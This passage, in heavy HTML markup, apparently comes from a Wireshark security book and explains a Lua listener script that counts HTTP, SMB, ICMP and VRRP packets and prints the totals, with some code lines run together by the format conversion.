style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:58.3500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if smb then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:87.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >smbcounter = smbcounter+1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:403.0500pt;margin-left:51.1500pt;text-indent:7.1500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText ><a name="_bookmark634" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This code tests the packet for various protocols. Lua returns </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >nil</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >if you try to use a variable that does not exist. In the first check, the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >icmpfield()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >returns a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >true</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >value, which is the value of the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >icmpfield</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >if the packet is an ICMP packet (as any value other than </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >nil</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >false</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >true</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). You can quickly check this in the Lua interactive interpreter, as follows:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:12.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:22.3500pt;text-indent:-14.3500pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if nil</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62; print('true')</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section339" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62; end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:22.3500pt;text-indent:-14.3500pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if true</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62; print('true')</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:431.7500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62; end true</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:22.3500pt;text-indent:-14.3500pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if 1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62; print('true')</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:431.7500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62; end true</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:22.3500pt;text-indent:-14.3500pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if false</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.5000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print('true')</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62; end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:5.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We also are checking to see if the IP protocol number is 6. The IP protocol number is the IP field that tells what the lower layer protocol is. The number 6 specifies that the IP packet is encapsulating a TCP packet. We do this because we know that HTTP and SMB are going to be going over TCP. So, rather than checking all packets for those fields, we check only TCP packets for those fields.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When the entire packet capture has been analyzed, each counter will hold the summary counts of each packet type. However, this information is not shown yet. To present the counts you gathered, you can use the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >draw </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >callback function used previously to print Hello World to the screen. This function is called when the capture is stopped or the entire capture file has been read in and analyzed.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="772"  height="280"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker424991.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:5.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To present the packet counts, just print every counter prefixed by the</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section340" ><p class=MsoBodyText  style="margin-top:3.5000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >protocol. We use the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >string.format </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >function, which formats the variables to a string based on the format specifier. In this case, we are using </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >%i</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, which represents a numbe<a name="_bookmark635" ></a>r (</span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >i </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >for integer). The following is the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >draw</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >function to be used within the counting packets script:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.1500pt;margin-right:101.7000pt;margin-left:51.1500pt;text-indent:-21.6000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function listener.draw() print(string.format("HTTP: %i", httpcounter)) print(string.format("SMB: %i", smbcounter)) print(string.format("VRRP: %i", vrrpcounter)) print(string.format("ICMP: %i", icmpcounter))</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.1500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Note that the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >draw</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >function has been filled in and that there are global counters defined at the top of the file. The completed source code follows:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h3 style="margin-top:7.8000pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >countpackets.lua</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></h3><p class=MsoNormal  style="margin-top:12.2000pt;margin-right:240.4500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- variables for our</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.2000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >counters local httpcounter =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.3500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >0</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:324.6000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local smbcounter = 0 local icmpcounter =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.8500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >0 local vrrpcounter =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.8500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >0</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:207.6000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- function to create our listner local function HelloWorldListener()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:178.7000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- create our listener with no filter local listener = Listener.new(nil, '')</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- create the variables which will hold our fields for each packet</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:187.0500pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local proto = Field.new('ip.proto') local httpfield = Field.new('http') local smbfield = Field.new('smb') local icmpfield = Field.new('icmp') local vrrpfield = Field.new('vrrp')</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:11.1500pt;margin-left:15.1500pt;text-indent:14.3500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- define the listener.packet function which is called for every packet</span><span style="mso-spacerun:'yes';font-family:'Courier 